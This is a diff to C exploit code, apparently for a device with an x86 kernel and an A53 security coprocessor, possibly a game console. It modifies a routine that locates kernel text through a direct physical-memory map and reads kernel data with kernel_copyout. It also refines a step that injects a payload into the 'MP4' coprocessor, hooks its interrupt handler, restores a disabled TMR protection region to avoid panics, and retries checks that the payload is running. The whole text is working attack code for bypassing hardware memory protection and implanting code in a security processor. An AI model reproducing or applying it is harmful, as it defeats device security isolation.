@@ -119,12 +119,14 @@ static int discover_kernel_base(struct phys_rw_ctx *ctx)
 
     ctx->ktext_base_pa = (uint64_t)tmr16_base << 16;
 
-    /* Read ktext_start_va from known offset in kernel data */
-    uint64_t ktext_va_addr = ctx->dmap_base + ctx->ktext_base_pa + KOFF_KTEXT_VA_PTR;
-    kernel_copyout(ktext_va_addr, &ctx->ktext_base, sizeof(ctx->ktext_base));
-
     printf("[*] Kernel text PA: 0x%lx\n", ctx->ktext_base_pa);
-    printf("[*] Kernel text VA: 0x%lx\n", ctx->ktext_base);
+
+    /* Derive kernel text VA from DMAP: any kernel VA = DMAP + PA works
+     * for accessing kernel data via kernel_copyout. We use DMAP+PA
+     * for all accesses since KOFF_KTEXT_VA_PTR is FW-specific and
+     * unreliable across firmware versions. */
+    ctx->ktext_base = ctx->dmap_base + ctx->ktext_base_pa;
+    printf("[*] Kernel text (DMAP): 0x%lx\n", ctx->ktext_base);
 
     /* Get kernel PML4 PA */
     uint64_t kpmap_addr = ctx->ktext_base + KOFF_KERNEL_PMAP;
@@ -216,13 +218,28 @@ int prosperous_run(void)
     }
     printf("[+] MP4 payload injected and activated\n");
 
-    /* Re-enable TMR 20 (prevents kernel panic on game restart) */
-    /* Note: tmr_bypass_init saved the original config */
+    /* Re-enable TMR 20 after injection (matches original prosperous flow).
+     * The A53 accesses its own DRAM through its IOMMU, not through x86 TMR.
+     * Leaving TMR 20 disabled causes kernel panics on game restart. */
+    tmr_restore_tmr20(&ctx);
+    printf("[+] TMR 20 restored\n");
 
-    /* Verify MP4 payload is alive */
-    ret = mp4_ping(&ctx);
+    /* Give the A53 time to process the QAF flag and activate the payload.
+     * The payload hooks mDbg_intr via SError handler - the A53 needs to
+     * take an interrupt cycle to activate the hook. */
+    printf("[*] Waiting for MP4 payload activation...\n");
+    usleep(500000); /* 500ms */
+
+    /* Verify MP4 payload is alive (retry a few times) */
+    for (int attempt = 0; attempt < 5; attempt++) {
+        ret = mp4_ping(&ctx);
+        if (ret == 0)
+            break;
+        printf("[*] MP4 ping attempt %d failed, retrying...\n", attempt + 1);
+        usleep(500000);
+    }
     if (ret != 0) {
-        printf("[!] MP4 payload not responding\n");
+        printf("[!] MP4 payload not responding after retries\n");
         tmr_restore_hv_regions(&ctx);
         return ret;
     }
